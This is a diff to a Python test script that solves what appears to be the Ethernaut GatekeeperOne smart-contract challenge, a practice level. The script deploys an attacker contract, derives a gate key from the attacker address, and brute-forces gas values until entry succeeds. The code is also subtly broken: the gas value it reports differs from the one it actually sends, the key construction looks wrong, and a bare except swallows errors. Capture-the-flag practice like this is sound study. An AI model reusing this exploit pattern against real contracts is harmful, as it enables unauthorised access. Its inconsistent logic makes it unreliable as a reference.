@@ -21,7 +21,7 @@ def prepare():
     target = GatekeeperOne.deploy({'from': a0})
 
     # attacker should start with little ETH balance
-    balance_to_burn = a1.balance() - 1*BIGNUMBER
+    balance_to_burn = a1.balance() - 10*BIGNUMBER
     burn_address = accounts[3]
     a1.transfer(burn_address,balance_to_burn)
 
@@ -31,8 +31,23 @@ def prepare():
 
 def attack(target):
 
-    # read target's storage and unlock
+    # deploy attacker
     attacker = Attacker.deploy(target,{'from':a1})
+
+    # find key for gateThree
+    txorigin = a1.address[-4:]
+    key = b'0x100000000000'+txorigin.encode()
+    print(key)
+    
+    # try many gas options to pass
+    for gastry in range(8192):
+        try:
+            print(gastry)
+            attacker.attack(key,900000+gastry,{'from':a1,'gas_limit':1000000})
+            REPORT.txt_print('Found gasToPass: {}'.format(700000+gastry))
+            break
+        except:
+            None
     
     if target.entrant() == a1.address:
         REPORT.txt_print('ATTACK SUCCESSFUL')
